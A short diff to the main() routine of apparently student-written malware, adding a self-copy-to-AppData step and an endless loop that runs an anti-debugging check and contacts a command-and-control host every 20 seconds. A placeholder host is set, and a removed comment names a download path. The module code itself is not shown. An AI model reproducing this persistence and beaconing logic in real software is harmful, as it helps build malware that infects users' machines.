@@ -14,20 +14,28 @@ int main()
 {
 	// instantiate modules
 	CP copyModule;
-	C2 connModule;// ("www.uvu-cybersecurity.com", "/downloaded.exe");
+	C2 connModule;
 	RM remvModule;
 	DB debgModule;
 	UTIL util;
 	util.isExecutingFromAppData();
+
+	if (!util.isExecutingFromAppData()) {
+		copyModule.execute();
+		debgModule.execute();
+		remvModule.execute();
+		return 0;
+	}
+
+
 	connModule.setPathName("/");
 	connModule.setHostName("www.google.com");
 
-	// do bad stuff
-	debgModule.execute();
-	copyModule.execute();
-	connModule.execute();
-	remvModule.execute();
-	//Sleep(5000);
-	
+	while (true) {
+		// do bad stuff
+		Sleep(20000);
+		debgModule.execute();
+		connModule.execute();
+	}
 }
 
